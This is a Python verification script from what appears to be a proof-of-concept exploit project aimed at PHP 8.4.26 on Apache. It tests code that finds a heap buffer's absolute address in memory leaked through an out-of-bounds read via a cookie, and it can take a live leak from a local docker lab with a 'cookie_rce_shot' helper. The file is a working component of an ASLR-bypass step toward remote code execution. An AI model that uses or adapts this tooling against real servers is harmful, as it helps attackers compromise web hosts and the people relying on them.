#!/usr/bin/env python3
"""Verify carrier_base_locate.py against (a) a synthetic carrier vector and
(b) a REAL leak buffer when one is available.

Claims under test:
  1. self_locate() recovers the carrier buffer's ABSOLUTE base from the
     self-referential pointers inside it, with no hardcoded chunk-relative
     constant.
  2. its base reduced to the 2 MiB chunk (base & ~0x1FFFFF) MATCHES the chunk
     parse_cookie_leak derives from the same blob.
  3. carrier_base - chunk_base reproduces
     BUILTIN_OFFSETS["8.4.26-apache"]["htdata_off"] == 0x690d8.

Run:
    python3 -I verify_carrier_base_locate.py                  # synthetic, no lab
    python3 -I verify_carrier_base_locate.py --blob leak.bin  # captured blob
    python3 -I verify_carrier_base_locate.py --live \
        --service apache-stock --url http://127.0.0.1:80 --restart
(the --live lab is the base docker-compose.yml `apache-stock` service, from
lab/apache-stock/Dockerfile -- bring it up with `docker compose up -d
apache-stock` and tear it down with `docker compose stop apache-stock`.)
"""

import os
import struct
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)

import carrier_base_locate  # noqa: E402

# leak parser, groom builders, offsets table and the compose helper used below
# (these moved out of the former central module; see apache_cookie_disclose.py).
# Run this file with python3 -I.
from common.offsets import BUILTIN_OFFSETS  # noqa: E402
from common.docker_compose import compose_restart  # noqa: E402
from primitives.read_leak.leak_parsers import parse_cookie_leak  # noqa: E402
from primitives.read_leak.apache_cookie_window_leak import (  # noqa: E402
    COOKIE_RCE_WINDOW, COOKIE_RCE_BULK, cookie_rce_shot)

APACHE = BUILTIN_OFFSETS["8.4.26-apache"]
HTDATA_OFF = APACHE["htdata_off"]          # 0x690d8
A_OFF = APACHE["a_off"]                     # 0x69000 (page-aligned carrier page)
SUBPAGE = HTDATA_OFF - A_OFF                # 0xd8 fixed zend_string data offset
CHUNK_MASK = ~0x1FFFFF


# Synthetic carrier vector.
def build_synthetic_carrier(chunk_base=0x7f1c2be00000,
                            a_off=A_OFF, window=0x2000,
                            n_nodes=200, noise=True):
    """Model the live-string carrier disclosed by the forward OOB read.

    The disclosed buffer's absolute base is the PAGE-aligned carrier page,
    carrier_base = chunk_base + a_off (= chunk + 0x69000); the live zend_string
    data (htdata_off == a_off + 0xd8) sits at buffer byte +0xd8. a_off is the
    per-build/per-profile groom geometry we want to recover independently.
    Inside the buffer we lay the real multipart parse-state chain: 0x40-stride
    words, each storing a pointer 0x40 AHEAD of itself (the self-referential
    chain; parse_cookie_leak's `w(off+0x40) == w(off)+0x40`). Those pointers all
    land inside the window, so they are genuine self-references.

    Returns (buf, chunk_base, carrier_base).
    """
    carrier_base = chunk_base + a_off
    buf = bytearray(os.urandom(window)) if noise else bytearray(window)

    def put(off, val):
        struct.pack_into("<Q", buf, off, val)

    # Parse-state chain: node at byte offset O, value points 0x40 ahead =>
    # word[O] == carrier_base + O + 0x40, so word[O+0x40] == word[O] + 0x40
    # (satisfies parse_cookie_leak) and the target (O+0x40) is inside the buffer
    # (satisfies self_locate's P-K self-reference). The chain is spread across
    # the WHOLE window (not confined to the first page) so the true base is the
    # unique vote max: base-0x1000 then loses the first-page nodes and
    # base+0x1000 loses the last-page nodes. Real forward disclosures (0xC8000)
    # span hundreds of pages, so this is the faithful geometry.
    chain_off = 0x80
    stride = 0x40
    o = chain_off
    placed = 0
    while o + stride + 8 <= window and placed < n_nodes:
        put(o, carrier_base + o + stride)
        o += stride
        placed += 1

    # A static-HashTable copy node so parse_cookie_leak can also surface binbase
    # (fidelity only; not needed for the base recovery). +0x20==0x10,
    # +0x28==0x8000..., +0x30==&zval_ptr_dtor, +0x10==rodata ptr. It must sit on
    # a word that is ALSO a chain word (off is a ptr with off+0x40 relation).
    binbase = 0x7f1c20000000
    ht = chain_off + 8 * stride          # a chain node, 0x40-related
    if ht + 0x38 <= window:
        put(ht + 0x20, 0x10)
        put(ht + 0x28, 0x8000000000000000)
        put(ht + 0x30, binbase + APACHE["zval_ptr_dtor"])
        put(ht + 0x10, binbase + APACHE["rodata_x"])

    # Non-self-referential heap-pointer noise (points elsewhere in the chunk,
    # OUTSIDE this window): must NOT out-vote the true base.
    if noise:
        for j in range(20):
            o = (0x40 * j) + 0x1000
            if o + 8 <= window:
                put(o, chunk_base + 0x3000 + j * 0x137)

    return bytes(buf), chunk_base, carrier_base


# Report one blob through both self_locate and parse_cookie_leak.
def check_blob(label, buf, expect_chunk=None, expect_carrier=None,
               min_votes=8):
    print(f"\n=== {label} ({len(buf)} bytes) ===")
    base, votes = carrier_base_locate.self_locate(buf, min_votes=min_votes)
    ok = True
    if base is None:
        print(f"  self_locate: NO quorum (best {votes} < {min_votes})")
        return False
    cb = carrier_base_locate.chunk_base(base)
    off = base - cb
    print(f"  self_locate carrier base = {base:#x} ({votes} votes)")
    print(f"  self_locate 2MiB chunk   = {cb:#x}")
    print(f"  self_locate chunk-rel    = {off:#x}  (vs hardcoded htdata_off "
          f"{HTDATA_OFF:#x})")

    # Cross-check against parse_cookie_leak on the same bytes.
    pc_chunk = None
    try:
        got = parse_cookie_leak(buf, APACHE)
        pc_chunk = got["chunk"]
        print(f"  parse_cookie_leak chunk    = {pc_chunk:#x}  "
              f"binbase={got['binbase'] and hex(got['binbase'])}")
    except ValueError as e:
        print(f"  parse_cookie_leak: {e}")

    if pc_chunk is not None:
        same = (cb == pc_chunk)
        print(f"  [claim 2] self_locate chunk == parse_cookie_leak chunk: "
              f"{'YES' if same else 'NO'}")
        ok &= same
    if expect_chunk is not None:
        same = (cb == expect_chunk)
        print(f"  [expect ] chunk == {expect_chunk:#x}: "
              f"{'YES' if same else 'NO'}")
        ok &= same
    if expect_carrier is not None:
        same = (base == expect_carrier)
        print(f"  [expect ] carrier base == {expect_carrier:#x}: "
              f"{'YES' if same else 'NO'}")
        ok &= same
    repro = (off == A_OFF)
    print(f"  [claim 3] chunk-rel page off reproduces a_off {A_OFF:#x}: "
          f"{'YES' if repro else 'NO'}")
    print(f"            => htdata_off = a_off + {SUBPAGE:#x} (fixed "
          f"zend_string offset) = {off + SUBPAGE:#x} "
          f"(hardcoded {HTDATA_OFF:#x}: "
          f"{'MATCH' if off + SUBPAGE == HTDATA_OFF else 'MISMATCH'})")
    ok &= repro
    return ok


# Optional live capture (uses php2shell's live-capture helpers).
def capture_live(service, url, tunes, spray, window, bulk, restart):
    for t in tunes:
        if restart:
            compose_restart(service)
        for parity in (False, True):
            try:
                r1h, r2h, r2b, cookie, verdict = cookie_rce_shot(
                    service, url.rstrip("/"), t, spray, window, bulk, parity)
            except Exception as e:  # noqa: BLE001
                print(f"  [live] tune={t}/p{int(parity)} error: {e!r}")
                continue
            print(f"  [live] tune={t}/p{int(parity)} verdict={verdict} "
                  f"({len(cookie) if cookie is not None else 0} bytes)")
            if verdict == "hit" and cookie is not None:
                return cookie
    return None


def main(argv):
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--blob", help="captured real leak blob (raw or hex)")
    ap.add_argument("--min-votes", type=int, default=8)
    ap.add_argument("--live", action="store_true",
                    help="capture a fresh disclosure from a lab")
    ap.add_argument("--service", default="apache-stock")
    ap.add_argument("--url", default="http://127.0.0.1:80")
    ap.add_argument("--restart", action="store_true",
                    help="restart the service before each tune (fresh ASLR)")
    ap.add_argument("--spray", type=int, default=16)
    ap.add_argument("--window", type=int, default=COOKIE_RCE_WINDOW)
    ap.add_argument("--bulk", type=int, default=COOKIE_RCE_BULK)
    a = ap.parse_args(argv)

    all_ok = True

    # 1) Synthetic proof (always).
    buf, cb, carrier = build_synthetic_carrier()
    all_ok &= check_blob("SYNTHETIC carrier (page base chunk+a_off, "
                         "self-ref chain)", buf, expect_chunk=cb,
                         expect_carrier=carrier, min_votes=a.min_votes)

    # Negative control: no self-refs -> no quorum (algorithm doesn't invent a
    # base out of random pointers).
    import os as _os
    noise_only = bytearray(_os.urandom(0x2000))
    for j in range(30):
        struct.pack_into("<Q", noise_only, 0x40 * j,
                         (cb & CHUNK_MASK) + 0x5000 + j * 0x911)
    nb, nv = carrier_base_locate.self_locate(bytes(noise_only), min_votes=a.min_votes)
    print(f"\n=== NEGATIVE control (scattered non-self-ref ptrs) ===")
    print(f"  self_locate -> {nb and hex(nb)} ({nv} votes); "
          f"expect no quorum: {'OK' if nb is None else 'UNEXPECTED'}")
    all_ok &= (nb is None)

    # 2) Real blob from file / auto-detect poc/cookie-window.bin.
    blob_path = a.blob
    if blob_path is None:
        auto = os.path.join(_HERE, "cookie-window.bin")
        if os.path.exists(auto):
            blob_path = auto
            print(f"\n[info] auto-loading {auto}")
    if blob_path:
        raw = carrier_base_locate._read_blob(blob_path)
        check_blob(f"REAL blob {os.path.basename(blob_path)}", raw,
                   min_votes=a.min_votes)

    # 3) Live capture.
    if a.live:
        print(f"\n[live] capturing from service={a.service} url={a.url} "
              f"(restart={a.restart})")
        tunes = (12232, 12264, 8168, 4072, 3048, 0)
        cookie = capture_live(a.service, a.url, tunes, a.spray, a.window,
                              a.bulk, a.restart)
        if cookie is None:
            print("[live] no disclosure captured (tune/groom miss or lab "
                  "unreachable)")
        else:
            check_blob("LIVE disclosure", cookie, min_votes=a.min_votes)

    print(f"\n{'ALL SYNTHETIC CLAIMS PASS' if all_ok else 'SOME CHECKS FAILED'}")
    return 0 if all_ok else 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
